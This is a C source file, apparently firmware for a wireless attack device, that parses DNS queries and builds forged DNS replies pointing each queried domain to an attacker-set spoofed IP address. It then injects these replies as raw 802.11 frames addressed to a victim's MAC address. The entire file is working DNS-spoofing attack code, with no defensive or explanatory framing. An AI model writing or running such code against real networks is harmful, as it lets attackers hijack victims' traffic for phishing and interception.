#include "dns_utils.h"
#include "packet_utils.h"

extern IPAddress SPOOFED_IP;
extern char TARGET_DOMAIN_STR[];

bool parseDnsQueryDomain(const uint8_t* dnsData, uint16_t dnsLen,
                         char* out, uint8_t outLen) {
    if (dnsLen < 12) return false;
    uint16_t pos = 12;
    uint8_t outPos = 0;
    while (pos < dnsLen) {
        uint8_t labelLen = dnsData[pos++];
        if (labelLen == 0) break;
        if (labelLen & 0xC0) return false;
        if (outPos > 0) {
            if (outPos >= outLen - 1) return false;
            out[outPos++] = '.';
        }
        for (uint8_t i = 0; i < labelLen; i++) {
            if (pos >= dnsLen || outPos >= outLen - 1) return false;
            out[outPos++] = dnsData[pos++];
        }
    }
    out[outPos] = '\0';
    return (outPos > 0);
}

void sendDnsResponse(const uint8_t* originalIpPkt, const uint8_t* originalUdpPkt,
                     const uint8_t* dnsData, uint16_t dnsLen,
                     const uint8_t* victimMac, const uint8_t* ourMac,
                     const uint8_t* bssid) {
    uint8_t response[512];
    uint8_t* ipHdr = response;
    uint8_t* udpHdr = &response[20];
    uint8_t* dnsResp = &response[28];
    
    dnsResp[0] = dnsData[0]; dnsResp[1] = dnsData[1];
    dnsResp[2] = 0x81; dnsResp[3] = 0x80;
    dnsResp[4] = dnsData[4]; dnsResp[5] = dnsData[5];
    dnsResp[6] = 0x00; dnsResp[7] = 0x01;
    dnsResp[8] = 0x00; dnsResp[9] = 0x00;
    dnsResp[10] = 0x00; dnsResp[11] = 0x00;
    
    uint16_t qPos = 12;
    while (qPos < dnsLen && dnsData[qPos] != 0) {
        uint8_t l = dnsData[qPos++];
        if (l & 0xC0) { qPos++; break; }
        qPos += l;
    }
    if (qPos < dnsLen && dnsData[qPos] == 0) qPos++;
    qPos += 4;
    if (qPos > dnsLen) return;
    uint16_t questionLen = qPos - 12;
    memcpy(&dnsResp[12], &dnsData[12], questionLen);
    
    uint16_t ansOffset = 12 + questionLen;
    dnsResp[ansOffset++] = 0xC0; dnsResp[ansOffset++] = 0x0C;
    dnsResp[ansOffset++] = 0x00; dnsResp[ansOffset++] = 0x01;
    dnsResp[ansOffset++] = 0x00; dnsResp[ansOffset++] = 0x01;
    dnsResp[ansOffset++] = 0x00; dnsResp[ansOffset++] = 0x00;
    dnsResp[ansOffset++] = 0x01; dnsResp[ansOffset++] = 0x2C;
    dnsResp[ansOffset++] = 0x00; dnsResp[ansOffset++] = 0x04;
    dnsResp[ansOffset++] = SPOOFED_IP[0]; dnsResp[ansOffset++] = SPOOFED_IP[1];
    dnsResp[ansOffset++] = SPOOFED_IP[2]; dnsResp[ansOffset++] = SPOOFED_IP[3];
    
    uint16_t dnsRespLen = ansOffset;
    uint16_t udpTotalLen = 8 + dnsRespLen;
    uint16_t ipTotalLen = 20 + udpTotalLen;
    
    ipHdr[0] = 0x45; ipHdr[1] = 0x00;
    ipHdr[2] = (ipTotalLen >> 8) & 0xFF; ipHdr[3] = ipTotalLen & 0xFF;
    ipHdr[4] = 0x00; ipHdr[5] = 0x00;
    ipHdr[6] = 0x00; ipHdr[7] = 0x00;
    ipHdr[8] = 64; ipHdr[9] = 17;
    ipHdr[10] = 0x00; ipHdr[11] = 0x00;
    memcpy(&ipHdr[12], &originalIpPkt[16], 4);
    memcpy(&ipHdr[16], &originalIpPkt[12], 4);
    uint16_t csum = ipChecksum(ipHdr, 20);
    ipHdr[10] = csum & 0xFF; ipHdr[11] = (csum >> 8) & 0xFF;
    
    uint16_t srcPort = (originalUdpPkt[2] << 8) | originalUdpPkt[3];
    uint16_t dstPort = (originalUdpPkt[0] << 8) | originalUdpPkt[1];
    udpHdr[0] = (srcPort >> 8) & 0xFF; udpHdr[1] = srcPort & 0xFF;
    udpHdr[2] = (dstPort >> 8) & 0xFF; udpHdr[3] = dstPort & 0xFF;
    udpHdr[4] = (udpTotalLen >> 8) & 0xFF; udpHdr[5] = udpTotalLen & 0xFF;
    udpHdr[6] = 0x00; udpHdr[7] = 0x00;
    
    inject80211(victimMac, ourMac, bssid, LLC_SNAP_IP, ipHdr, ipTotalLen);
}
